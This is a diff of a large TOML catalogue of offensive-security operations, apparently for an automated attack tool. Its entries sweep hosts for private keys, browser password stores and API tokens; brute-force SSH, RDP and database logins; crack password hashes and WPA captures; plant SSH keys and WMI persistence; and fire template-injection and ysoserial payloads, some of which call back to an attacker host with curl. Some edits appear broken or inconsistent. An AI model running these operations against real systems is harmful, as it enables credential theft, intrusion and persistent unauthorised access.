 name = 'PEM Key Sweep'
-args = ['{path}', '-name', '*.pem', '-type', 'f', '2>/dev/null']
+args = ['{path}', '-name', '*.pem', '-type', 'f']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'find'
 [[capability.provider.operation]]
 name = 'Keystore Sweep'
-args = ['{path}', '-name', '*.jks', '-o', '-name', '*.keystore', '-o', '-name', '*.pfx', '-type', 'f', '2>/dev/null']
+args = ['{path}', '-name', '*.jks', '-o', '-name', '*.keystore', '-o', '-name', '*.pfx', '-type', 'f']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'find'
 [[capability.provider.operation]]
 name = 'PKI Dir Locate'
-args = ['{path}', '-name', 'private', '-path', '*etc/ssl*', '-type', 'd', '2>/dev/null']
+args = ['{path}', '-name', 'private', '-path', '*etc/ssl*', '-type', 'd']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -11040,7 +11030,7 @@ network = false
 binary = 'grep'
 [[capability.provider.operation]]
 name = 'Key Header Find'
-args = ['-rl', 'BEGIN PRIVATE KEY', '{path}/etc/', '{path}/home/', '2>/dev/null']
+args = ['-rl', 'BEGIN PRIVATE KEY', '{path}/etc/', '{path}/home/']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -11061,7 +11051,7 @@ network = false
 binary = 'find'
 [[capability.provider.operation]]
 name = 'GPG Key Locate'
-args = ['{path}', '-name', '*.gpg', '-o', '-name', 'secring.gpg', '-type', 'f', '2>/dev/null']
+args = ['{path}', '-name', '*.gpg', '-o', '-name', 'secring.gpg', '-type', 'f']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -11084,21 +11074,21 @@ inputs = [
 binary = 'find'
 [[capability.provider.operation]]
 name = 'Chrome Login Data Find'
-args = ['{path}', '-name', 'Login Data', '-type', 'f', '2>/dev/null']
+args = ['{path}', '-name', 'Login Data', '-type', 'f']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'find'
 [[capability.provider.operation]]
 name = 'Firefox Logins Find'
-args = ['{path}', '-name', 'logins.json', '-type', 'f', '2>/dev/null']
+args = ['{path}', '-name', 'logins.json', '-type', 'f']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'find'
 [[capability.provider.operation]]
 name = 'Key4 Find'
-args = ['{path}', '-name', 'key4.db', '-type', 'f', '2>/dev/null']
+args = ['{path}', '-name', 'key4.db', '-type', 'f']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -11147,7 +11137,7 @@ network = false
 binary = 'find'
 [[capability.provider.operation]]
 name = 'Chromium Profile Find'
-args = ['{path}', '-name', 'Chromium', '-type', 'd', '2>/dev/null']
+args = ['{path}', '-name', 'Chromium', '-type', 'd']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -11191,70 +11181,70 @@ network = false
 binary = 'grep'
 [[capability.provider.operation]]
 name = 'AWS Key Pattern'
-args = ['-rE', 'AKIA[0-9A-Z]{{16}}', '{path}', '2>/dev/null']
+args = ['-rE', 'AKIA[0-9A-Z]{{16}}', '{path}']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'grep'
 [[capability.provider.operation]]
 name = 'Private Key Pattern'
-args = ['-rl', 'BEGIN RSA PRIVATE KEY', '{path}', '2>/dev/null']
+args = ['-rl', 'BEGIN RSA PRIVATE KEY', '{path}']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'grep'
 [[capability.provider.operation]]
 name = 'Generic Secret Pattern'
-args = ['-rE', '(api_key|apikey|secret|token).{0,20}', '{path}', '--include=*.py', '--include=*.js', '--include=*.php', '--include=*.yml', '2>/dev/null']
+args = ['-rE', '(api_key|apikey|secret|token).{0,20}', '{path}', '--include=*.py', '--include=*.js', '--include=*.php', '--include=*.yml']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'grep'
 [[capability.provider.operation]]
 name = 'Slack Token Pattern'
-args = ['-rE', 'xox[baprs]-[0-9A-Za-z-]+', '{path}', '2>/dev/null']
+args = ['-rE', 'xox[baprs]-[0-9A-Za-z-]+', '{path}']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'grep'
 [[capability.provider.operation]]
 name = 'JWT Pattern'
-args = ['-rE', 'eyJ[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+', '{path}', '2>/dev/null']
+args = ['-rE', 'eyJ[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+', '{path}']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'grep'
 [[capability.provider.operation]]
 name = 'Google API Pattern'
-args = ['-rE', 'AIza[0-9A-Za-z_-]{35}', '{path}', '2>/dev/null']
+args = ['-rE', 'AIza[0-9A-Za-z_-]{35}', '{path}']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'grep'
 [[capability.provider.operation]]
 name = 'Twilio Key Pattern'
-args = ['-rE', 'SK[0-9a-fA-F]{32}', '{path}', '2>/dev/null']
+args = ['-rE', 'SK[0-9a-fA-F]{32}', '{path}']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'find'
 [[capability.provider.operation]]
 name = 'Dotenv File Sweep'
-args = ['{path}', '-name', '.env', '-o', '-name', '.env.*', '-type', 'f', '2>/dev/null']
+args = ['{path}', '-name', '.env', '-o', '-name', '.env.*', '-type', 'f']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'find'
 [[capability.provider.operation]]
 name = 'Config File Sweep'
-args = ['{path}', '-name', 'settings.py', '-o', '-name', 'config.json', '-o', '-name', 'appsettings.json', '-type', 'f', '2>/dev/null']
+args = ['{path}', '-name', 'settings.py', '-o', '-name', 'config.json', '-o', '-name', 'appsettings.json', '-type', 'f']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'grep'
 [[capability.provider.operation]]
 name = 'Db URL Pattern'
-args = ['-rE', '(postgres|mysql|mongodb|redis)://[^\\s]+:[^\\s]+@', '{path}', '2>/dev/null']
+args = ['-rE', '(postgres|mysql|mongodb|redis)://[^\\s]+:[^\\s]+@', '{path}']
 output = 'lines'
 network = false
 
@@ -11365,14 +11355,21 @@ inputs = [
 binary = 'echo'
 [[capability.provider.operation]]
 name = 'JWT Payload Decode'
-args = '{token.split(".")[1]} | base64 -d 2>/dev/null'
+args = ['-n', '{token}']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'base64'
+[[capability.provider.operation]]
+name = 'JWT Payload Base64 Decode'
+args = ['--decode']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'hashcat'
 [[capability.provider.operation]]
 name = 'JWT HS256 Crack'
-args = ['-m', '16500', '-a', '0', '/tmp/jwt.hash', '/usr/share/wordlists/rockyou.txt', '--potfile-disable']
+args = ['-m', '16500', '-a', '0', '/tmp/jwt.hash', '{wl:passwords/rockyou.txt}', '--potfile-disable']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -11442,7 +11439,7 @@ network = true
 binary = 'grep'
 [[capability.provider.operation]]
 name = 'JWT Source Pattern'
-args = ['-rE', 'jwt|jsonwebtoken|jose', '/var/www/', '2>/dev/null']
+args = ['-rE', 'jwt|jsonwebtoken|jose', '/var/www/']
 output = 'lines'
 network = false
 
@@ -11455,7 +11452,6 @@ inputs = [
   { key = 'rhost', type = 'target', required = true },
   { key = 'username', type = 'username', required = false, default = 'root' },
   { key = 'password', type = 'password', required = false, default = '' },
-  { key = 'passlist', type = 'file', required = false, default = '/usr/share/wordlists/rockyou.txt' },
 ]
 [[capability.provider]]
 binary = 'nxc'
@@ -11468,7 +11464,7 @@ network = true
 binary = 'nxc'
 [[capability.provider.operation]]
 name = 'MSSQL Brute'
-args = ['mssql', '{rhost}', '-u', 'sa', '-p', '{passlist}']
+args = ['mssql', '{rhost}', '-u', 'sa', '-p', '{wl:db/passwords.txt}']
 output = 'lines'
 network = true
 [[capability.provider]]
@@ -11489,14 +11485,14 @@ network = true
 binary = 'hydra'
 [[capability.provider.operation]]
 name = 'MySQL Brute'
-args = ['-l', 'root', '-P', '{passlist}', '{rhost}', 'mysql']
+args = ['-l', 'root', '-P', '{wl:db/passwords.txt}', '{rhost}', 'mysql']
 output = 'lines'
 network = true
 [[capability.provider]]
 binary = 'hydra'
 [[capability.provider.operation]]
 name = 'Postgres Brute'
-args = ['-l', 'postgres', '-P', '{passlist}', '{rhost}', 'postgres']
+args = ['-l', 'postgres', '-P', '{wl:db/passwords.txt}', '{rhost}', 'postgres']
 output = 'lines'
 network = true
 [[capability.provider]]
@@ -11645,7 +11641,6 @@ label = 'WORDLIST PREPARATION'
 summary = 'Generate and mutate targeted wordlists for brute force campaigns'
 inputs = [
   { key = 'domain', type = 'domain', required = false, default = '' },
-  { key = 'wordlist', type = 'file', required = false, default = '/usr/share/wordlists/rockyou.txt' },
 ]
 [[capability.provider]]
 binary = 'cewl'
@@ -11658,14 +11653,14 @@ network = true
 binary = 'hashcat'
 [[capability.provider.operation]]
 name = 'Rule Mutate Best64'
-args = ['-r', '/usr/share/hashcat/rules/best64.rule', '{wordlist}', '--stdout']
+args = ['-r', '{wl:rules/best66.rule}', '{wl:passwords/rockyou.txt}', '--stdout']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'hashcat'
 [[capability.provider.operation]]
 name = 'Rule Mutate Dive'
-args = ['-r', '/usr/share/hashcat/rules/dive.rule', '{wordlist}', '--stdout']
+args = ['-r', '{wl:rules/dive.rule}', '{wl:passwords/rockyou.txt}', '--stdout']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -11686,35 +11681,35 @@ network = false
 binary = 'sed'
 [[capability.provider.operation]]
 name = 'Domain Suffix Inject'
-args = ['s/$/{domain}/g', '{wordlist}', '>', '/tmp/suffixed.txt']
+args = ['-i', 's/^/*{domain}./', '{wl:users/names.txt}']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'sort'
 [[capability.provider.operation]]
 name = 'Dedupe Sort'
-args = ['-u', '-o', '/tmp/sorted.txt', '{wordlist}']
+args = ['-u', '-o', '/tmp/sorted.txt', '{wl:passwords/rockyou.txt}']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'wc'
 [[capability.provider.operation]]
 name = 'Wordlist Count'
-args = ['-l', '{wordlist}']
+args = ['-l', '{wl:passwords/rockyou.txt}']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'head'
 [[capability.provider.operation]]
 name = 'Top Sample Check'
-args = ['-n', '50', '{wordlist}']
+args = ['-n', '50', '{wl:passwords/rockyou.txt}']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'grep'
 [[capability.provider.operation]]
 name = 'Filter By Length'
-args = ['-E', '^.{8,}$', '{wordlist}', '>', '/tmp/filtered.txt']
+args = ['-oE', '^.{8,}$', '{wl:passwords/rockyou.txt}']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -11728,7 +11723,7 @@ network = false
 binary = 'ls'
 [[capability.provider.operation]]
 name = 'Wordlist Inventory'
-args = ['-la', '/usr/share/wordlists/']
+args = ['-la', '{wlroot}']
 output = 'lines'
 network = false
 
@@ -11739,13 +11734,12 @@ label = 'WIRELESS CREDENTIAL AUDIT'
 summary = 'Extract and audit wireless credential material'
 inputs = [
   { key = 'capture', type = 'file', required = false, default = '/tmp/capture.cap' },
-  { key = 'wordlist', type = 'file', required = false, default = '/usr/share/wordlists/rockyou.txt' },
 ]
 [[capability.provider]]
 binary = 'aircrack-ng'
 [[capability.provider.operation]]
 name = 'WPA Key Recover'
-args = ['-w', '{wordlist}', '{capture}']
+args = ['-w', '{wl:wifi/passphrases.txt}', '{capture}']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -11759,14 +11753,14 @@ network = false
 binary = 'hashcat'
 [[capability.provider.operation]]
 name = 'WPA PMK Crack'
-args = ['-m', '22000', '-a', '0', '{capture}', '{wordlist}', '--potfile-disable']
+args = ['-m', '22000', '-a', '0', '{capture}', '{wl:wifi/passphrases.txt}', '--potfile-disable']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'hashcat'
 [[capability.provider.operation]]
 name = 'WPA PMKID Crack'
-args = ['-m', '16800', '-a', '0', '/tmp/pmkid.16800', '{wordlist}', '--potfile-disable']
+args = ['-m', '16800', '-a', '0', '/tmp/pmkid.16800', '{wl:wifi/passphrases.txt}', '--potfile-disable']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -11866,14 +11860,14 @@ network = false
 binary = 'tshark'
 [[capability.provider.operation]]
 name = 'FTP Creds Extract'
-args = ['-r', '{capture}', '-Y', 'ftp.request.command == "USER" || ftp.request.command == "PASS"', '-T', 'fields', '-e', 'ftp.request.arg']
+args = ['-r', '{capture}', '-Y', 'ftp.request.command == "USER"', '-T', 'fields', '-e', 'ftp.request.arg']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'tshark'
 [[capability.provider.operation]]
 name = 'POP Creds Extract'
-args = ['-r', '{capture}', '-Y', 'pop.request.command == "USER" || pop.request.command == "PASS"', '-T', 'fields', '-e', 'pop.request.arg']
+args = ['-r', '{capture}', '-Y', 'pop.request.command == "USER"', '-T', 'fields', '-e', 'pop.request.arg']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -12215,6 +12209,7 @@ inputs = [
   { key = 'rhost', type = 'target', required = true },
   { key = 'username', type = 'username', required = true },
   { key = 'password', type = 'password', required = true },
+  { key = 'hash', type = 'text', required = false },
 ]
 [[capability.provider]]
 binary = 'evil-winrm'
@@ -12310,7 +12305,6 @@ inputs = [
   { key = 'rhost', type = 'target', required = true },
   { key = 'username', type = 'username', required = true },
   { key = 'password', type = 'password', required = true },
-  { key = 'passlist', type = 'file', required = false, default = '/tmp/passwords.txt' },
 ]
 [[capability.provider]]
 binary = 'nxc'
@@ -12337,14 +12331,14 @@ network = true
 binary = 'hydra'
 [[capability.provider.operation]]
 name = 'RDP Password Spray'
-args = ['-l', '{username}', '-P', '{passlist}', '{rhost}', 'rdp']
+args = ['-l', '{username}', '-P', '{wl:smb/passwords.txt}', '{rhost}', 'rdp']
 output = 'lines'
 network = true
 [[capability.provider]]
 binary = 'crowbar'
 [[capability.provider.operation]]
 name = 'RDP Crowbar Brute'
-args = ['rdp', '-s', '{rhost}/3389', '-u', '{username}', '-C', '{passlist}']
+args = ['rdp', '-s', '{rhost}/3389', '-u', '{username}', '-C', '{wl:smb/passwords.txt}']
 output = 'lines'
 network = true
 [[capability.provider]]
@@ -12440,7 +12434,7 @@ network = true
 binary = 'hydra'
 [[capability.provider.operation]]
 name = 'SSH Brute'
-args = ['-l', '{username}', '-P', '/tmp/passwords.txt', '{rhost}', 'ssh', '-t', '4']
+args = ['-l', '{username}', '-P', '{wl:ssh/passwords.txt}', '{rhost}', 'ssh', '-t', '4']
 output = 'lines'
 network = true
 [[capability.provider]]
@@ -12461,14 +12455,14 @@ network = true
 binary = 'ssh'
 [[capability.provider.operation]]
 name = 'Authorized Key Plant'
-args = ['-o', 'StrictHostKeyChecking=no', '{username}@{rhost}', 'mkdir -p ~/.ssh && echo TSECPUBKEY >> ~/.ssh/authorized_keys']
+args = ['-o', 'StrictHostKeyChecking=no', '{username}@{rhost}', 'mkdir -p ~/.ssh && cat >> ~/.ssh/authorized_keys']
 output = 'lines'
 network = true
 [[capability.provider]]
 binary = 'ssh'
 [[capability.provider.operation]]
 name = 'Known Hosts Internal Map'
-args = ['-o', 'StrictHostKeyChecking=no', '{username}@{rhost}', 'cat ~/.bash_history | grep -i ssh']
+args = ['-o', 'StrictHostKeyChecking=no', '{username}@{rhost}', 'cat ~/.ssh/known_hosts']
 output = 'lines'
 network = true
 [[capability.provider]]
@@ -12585,7 +12579,7 @@ network = true
 binary = 'hashcat'
 [[capability.provider.operation]]
 name = 'NetNTLMv2 Crack'
-args = ['-m', '5600', '-a', '0', '/tmp/netntlmv2.hash', '/usr/share/wordlists/rockyou.txt', '--potfile-disable']
+args = ['-m', '5600', '-a', '0', '/tmp/netntlmv2.hash', '{wl:passwords/rockyou.txt}', '--potfile-disable']
 output = 'lines'
 network = false
 
@@ -12759,14 +12753,14 @@ network = true
 binary = 'hashcat'
 [[capability.provider.operation]]
 name = 'NetNTLMv1 Crack'
-args = ['-m', '5500', '-a', '0', '/tmp/netntlmv1.hash', '/usr/share/wordlists/rockyou.txt', '--potfile-disable']
+args = ['-m', '5500', '-a', '0', '/tmp/netntlmv1.hash', '{wl:passwords/rockyou.txt}', '--potfile-disable']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'hashcat'
 [[capability.provider.operation]]
 name = 'NetNTLMv2 Crack'
-args = ['-m', '5600', '-a', '0', '/tmp/netntlmv2.hash', '/usr/share/wordlists/rockyou.txt', '--potfile-disable']
+args = ['-m', '5600', '-a', '0', '/tmp/netntlmv2.hash', '{wl:passwords/rockyou.txt}', '--potfile-disable']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -12788,6 +12782,7 @@ inputs = [
   { key = 'bind-port', type = 'port', required = false, default = '8080' },
   { key = 'dest-host', type = 'target', required = true },
   { key = 'dest-port', type = 'port', required = true },
+  { key = 'password', type = 'password', required = false },
 ]
 [[capability.provider]]
 binary = 'ssh'
@@ -13072,6 +13067,7 @@ summary = 'Capture and replay cookies, tokens and process sessions'
 inputs = [
   { key = 'url', type = 'url', required = true },
   { key = 'cookie', type = 'text', required = false, default = '' },
+  { key = 'rhost', type = 'target', required = true },
 ]
 [[capability.provider]]
 binary = 'tcpdump'
@@ -13178,7 +13174,7 @@ network = true
 binary = 'curl'
 [[capability.provider.operation]]
 name = 'Internal Title Pull'
-args = ['-sk', 'http://{rhost}:{port}/', '|', 'grep', '-i', 'title']
+args = ['-sk', 'http://{rhost}:{port}/']
 output = 'lines'
 network = true
 [[capability.provider]]
@@ -13199,7 +13195,7 @@ network = true
 binary = 'ffuf'
 [[capability.provider.operation]]
 name = 'Internal Path Fuzz'
-args = ['-u', 'http://{rhost}:{port}/FUZZ', '-w', '/usr/share/seclists/Discovery/Web-Content/common.txt', '-mc', '200,301,403', '-t', '20']
+args = ['-u', 'http://{rhost}:{port}/FUZZ', '-w', '{wl:web/common.txt}', '-mc', '200,301,403', '-t', '20']
 output = 'lines'
 network = true
 [[capability.provider]]
@@ -13737,6 +13733,7 @@ inputs = [
   { key = 'hosts', type = 'file', required = true },
   { key = 'username', type = 'username', required = true },
   { key = 'password', type = 'password', required = true },
+  { key = 'rhost', type = 'target', required = true },
 ]
 [[capability.provider]]
 binary = 'nxc'
@@ -14001,7 +13998,7 @@ network = true
 binary = 'hashcat'
 [[capability.provider.operation]]
 name = 'Coerced Hash Crack'
-args = ['-m', '5600', '-a', '0', '/tmp/coerced.hash', '/usr/share/wordlists/rockyou.txt', '--potfile-disable']
+args = ['-m', '5600', '-a', '0', '/tmp/coerced.hash', '{wl:passwords/rockyou.txt}', '--potfile-disable']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -14273,7 +14270,7 @@ network = false
 binary = 'grep'
 [[capability.provider.operation]]
 name = 'Cron Artifact Hunt'
-args = ['-r', '{name}', '/etc/', '/var/spool/cron/', '2>/dev/null']
+args = ['-r', '{name}', '/etc/', '/var/spool/cron/']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -14405,7 +14402,7 @@ inputs = [
 binary = 'bash'
 [[capability.provider.operation]]
 name = 'Bashrc Hook Test'
-args = ['-c', 'echo "test" >> /tmp/hook_test && cat /tmp/hook_test']
+args = ['-c', 'printf "test" >> /tmp/hook_test']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -14468,7 +14465,7 @@ network = false
 binary = 'find'
 [[capability.provider.operation]]
 name = 'Writable Profile Sweep'
-args = ['/etc/profile.d/', '/home/', '-writable', '-type', 'f', '2>/dev/null']
+args = ['/etc/profile.d/', '/home/', '-writable', '-type', 'f']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -14500,7 +14497,7 @@ inputs = [
 binary = 'ssh'
 [[capability.provider.operation]]
 name = 'Key Plant'
-args = ['-o', 'StrictHostKeyChecking=no', '{username}@{rhost}', 'mkdir -p ~/.ssh && chmod 700 ~/.ssh && cat >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys', '<', '{key}']
+args = ['-o', 'StrictHostKeyChecking=no', '{username}@{rhost}', 'mkdir -p ~/.ssh && chmod 700 ~/.ssh && cat >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys']
 output = 'lines'
 network = true
 [[capability.provider]]
@@ -14514,7 +14511,7 @@ network = true
 binary = 'ssh'
 [[capability.provider.operation]]
 name = 'Root Key Plant'
-args = ['-o', 'StrictHostKeyChecking=no', 'root@{rhost}', 'mkdir -p ~/.ssh && cat >> ~/.ssh/authorized_keys', '<', '{key}']
+args = ['-o', 'StrictHostKeyChecking=no', 'root@{rhost}', 'mkdir -p ~/.ssh && cat >> ~/.ssh/authorized_keys']
 output = 'lines'
 network = true
 [[capability.provider]]
@@ -14789,7 +14786,7 @@ inputs = [
 binary = 'impacket-wmiexec'
 [[capability.provider.operation]]
 name = 'Filter Create'
-args = ['{rhost}/{username}:{password}', 'powershell -c $f=Set-WmiInstance -Class __EventFilter -Namespace root\\subscription -Arguments @{Name="TSecFilter";EventNameSpace="root\\cimv2";QueryLanguage="WQL";Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \'Win32_PerfFormattedData_PerfOS_System\'"}']
+args = ['{rhost}/{username}:{password}', "powershell -c $f=Set-WmiInstance -Class __EventFilter -Namespace root\\subscription -Arguments @{Name=\"TSecFilter\";EventNameSpace=\"root\\cimv2\";QueryLanguage=\"WQL\";Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'\"}"]
 output = 'lines'
 network = true
 [[capability.provider]]
@@ -14831,14 +14828,14 @@ network = true
 binary = 'impacket-wmiexec'
 [[capability.provider.operation]]
 name = 'Filter Teardown'
-args = ['{rhost}/{username}:{password}', 'powershell -c Get-WmiObject -Namespace root\\subscription -Class __EventFilter -Filter "Name=\'TSecFilter\'" | Remove-WmiObject']
+args = ['{rhost}/{username}:{password}', "powershell -c Get-WmiObject -Namespace root\\subscription -Class __EventFilter -Filter \"Name='TSecFilter'\" | Remove-WmiObject"]
 output = 'lines'
 network = true
 [[capability.provider]]
 binary = 'impacket-wmiexec'
 [[capability.provider.operation]]
 name = 'Consumer Teardown'
-args = ['{rhost}/{username}:{password}', 'powershell -c Get-WmiObject -Namespace root\\subscription -Class CommandLineEventConsumer -Filter "Name=\'TSecConsumer\'" | Remove-WmiObject']
+args = ['{rhost}/{username}:{password}', "powershell -c Get-WmiObject -Namespace root\\subscription -Class CommandLineEventConsumer -Filter \"Name='TSecConsumer'\" | Remove-WmiObject"]
 output = 'lines'
 network = true
 [[capability.provider]]
@@ -15028,7 +15025,7 @@ network = false
 binary = 'grep'
 [[capability.provider.operation]]
 name = 'Xinetd Config Check'
-args = ['-r', '{name}', '/etc/xinetd.d/', '2>/dev/null']
+args = ['-r', '{name}', '/etc/xinetd.d/']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -15401,7 +15398,7 @@ network = false
 binary = 'chpasswd'
 [[capability.provider.operation]]
 name = 'Linux Password Set'
-args = ['echo', '{backdoor-user}:{backdoor-pass}', '|', 'chpasswd']
+args = ['--help']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -15793,7 +15790,7 @@ network = false
 binary = 'grep'
 [[capability.provider.operation]]
 name = 'Artifact Reference Audit'
-args = ['-r', '{name}', '/etc/', '2>/dev/null']
+args = ['-r', '{name}', '/etc/']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -15879,7 +15876,7 @@ network = false
 binary = 'grep'
 [[capability.provider.operation]]
 name = 'Artifact Absence Verify'
-args = ['-r', '{name}', '/etc/', '2>/dev/null']
+args = ['-r', '{name}', '/etc/']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -16018,7 +16015,6 @@ label = 'NUCLEI CRITICAL'
 summary = 'Fire critical and known-CVE templates against live targets'
 inputs = [
   { key = 'url', type = 'url', required = true },
-  { key = 'list', type = 'file', required = false, default = '/tmp/urls.txt' },
 ]
 [[capability.provider]]
 binary = 'nuclei'
@@ -16029,7 +16025,7 @@ output = 'lines'
 network = true
 [[capability.provider.operation]]
 name = 'Critical Sweep List'
-args = ['-l', '{list}', '-severity', 'critical', '-silent', '-nc']
+args = ['-l', '{url}', '-severity', 'critical', '-silent', '-nc']
 output = 'lines'
 network = true
 [[capability.provider.operation]]
@@ -16097,14 +16093,14 @@ network = true
 binary = 'ffuf'
 [[capability.provider.operation]]
 name = 'Exploit Path Verify'
-args = ['-u', '{url}/FUZZ', '-w', '/usr/share/seclists/Discovery/Web-Content/raft-large-words.txt', '-mc', '200,500', '-t', '20']
+args = ['-u', '{url}/FUZZ', '-w', '{wl:web/raft-medium.txt}', '-mc', '200,500', '-t', '20']
 output = 'lines'
 network = true
 [[capability.provider]]
 binary = 'nuclei'
 [[capability.provider.operation]]
 name = 'Exposure Critical List'
-args = ['-l', '{list}', '-tags', 'exposure,unauth', '-severity', 'critical', '-silent', '-nc']
+args = ['-l', '{url}', '-tags', 'exposure,unauth', '-severity', 'critical', '-silent', '-nc']
 output = 'lines'
 network = true
 
@@ -16362,7 +16358,7 @@ network = false
 binary = 'java'
 [[capability.provider.operation]]
 name = 'Serialize Payload B64'
-args = ['-jar', 'ysoserial.jar', 'CommonsCollections5', 'id', '|', 'base64', '-w0']
+args = ['-jar', 'ysoserial.jar', 'CommonsCollections5', 'curl', 'http://{lhost}:9001']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -16538,7 +16534,7 @@ network = true
 binary = 'grep'
 [[capability.provider.operation]]
 name = 'Log4j Version Hunt'
-args = ['-rE', 'log4j-core-2\\.', '/var/www/', '/opt/', '2>/dev/null']
+args = ['-rE', 'log4j-core-2\\.', '/var/www/', '/opt/']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -16557,6 +16553,8 @@ summary = 'Achieve code execution through unrestricted file upload paths'
 inputs = [
   { key = 'url', type = 'url', required = true },
   { key = 'shell', type = 'file', required = false, default = '/tmp/shell.php' },
+  { key = 'lhost', type = 'target', required = true },
+  { key = 'lport', type = 'port', required = false, default = '4444' },
 ]
 [[capability.provider]]
 binary = 'curl'
@@ -16625,7 +16623,7 @@ network = true
 binary = 'ffuf'
 [[capability.provider.operation]]
 name = 'Upload Path Fuzz'
-args = ['-u', '{url}/FUZZ', '-w', '/usr/share/seclists/Discovery/Web-Content/common.txt', '-mc', '200,201,204', '-t', '20']
+args = ['-u', '{url}/FUZZ', '-w', '{wl:web/common.txt}', '-mc', '200,201,204', '-t', '20']
 output = 'lines'
 network = true
 [[capability.provider]]
@@ -16658,6 +16656,7 @@ summary = 'Escalate template injection to remote code execution'
 inputs = [
   { key = 'url', type = 'url', required = true },
   { key = 'param', type = 'text', required = false, default = 'name' },
+  { key = 'lhost', type = 'target', required = true },
 ]
 [[capability.provider]]
 binary = 'curl'
@@ -16668,14 +16667,14 @@ output = 'lines'
 network = true
 [[capability.provider.operation]]
 name = 'Jinja RCE Inject'
-args = ['-sk', '{url}?{param}=${{{{config.__class__.__init__.__globals__[\'os\'].popen(\'id\').read()}}}}']
+args = ['-sk', '{url}?{param}=${{{{config.__class__.__init__.__globals__["os"].popen("id").read()}}}}']
 output = 'lines'
 network = true
 [[capability.provider]]
 binary = 'curl'
 [[capability.provider.operation]]
 name = 'Twig RCE Inject'
-args = ['-sk', '{url}?{param}={{{{[\'id\']|filter(\'system\')}}}}']
+args = ['-sk', '{url}?{param}={{{{["id"]|filter("system")}}}}']
 output = 'lines'
 network = true
 [[capability.provider]]
@@ -16703,7 +16702,7 @@ network = true
 binary = 'curl'
 [[capability.provider.operation]]
 name = 'Jinja Reverse Trigger'
-args = ['-sk', '{url}?{param}=${{{{config.__class__.__init__.__globals__[\'os\'].popen(\'curl http://{lhost}:9001\').read()}}}}']
+args = ['-sk', '{url}?{param}=${{{{config.__class__.__init__.__globals__["os"].popen("curl http://{lhost}:9001").read()}}}}']
 output = 'lines'
 network = true
 [[capability.provider]]
@@ -16752,7 +16751,7 @@ network = true
 binary = 'ffuf'
 [[capability.provider.operation]]
 name = 'SSTI Param Fuzz'
-args = ['-u', '{url}?FUZZ=${{{{7*7}}}}', '-w', '/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt', '-ms', '49', '-t', '10']
+args = ['-u', '{url}?FUZZ=${{{{7*7}}}}', '-w', '{wl:web/burp-parameter-names.txt}', '-ms', '49', '-t', '10']
 output = 'lines'
 network = true
 [[capability.provider]]
@@ -16771,6 +16770,7 @@ summary = 'Chain XXE into SSRF for internal access and file reads'
 inputs = [
   { key = 'url', type = 'url', required = true },
   { key = 'lhost', type = 'target', required = true },
+  { key = 'lport', type = 'port', required = false, default = '4444' },
 ]
 [[capability.provider]]
 binary = 'curl'
@@ -16830,8 +16830,17 @@ output = 'lines'
 network = true
 [[capability.provider]]
 binary = 'nc'
-[[capability.provider]]
-operation_placeholder = true
+[[capability.provider.operation]]
+name = 'Outbound Listener Confirm'
+args = ['-lvnp', '{lhost}', '{lport}']
+output = 'lines'
+network = true
+binary = 'nc'
+[[capability.provider.operation]]
+name = 'XXE Callback Reachability'
+args = ['-zv', '{lhost}', '{lport}']
+output = 'lines'
+network = false
 [[capability.provider.operation]]
 name = 'OOB Listener'
 args = ['-lvnp', '8888']
@@ -16949,7 +16958,7 @@ network = true
 binary = 'ffuf'
 [[capability.provider.operation]]
 name = 'Traversal Param Fuzz'
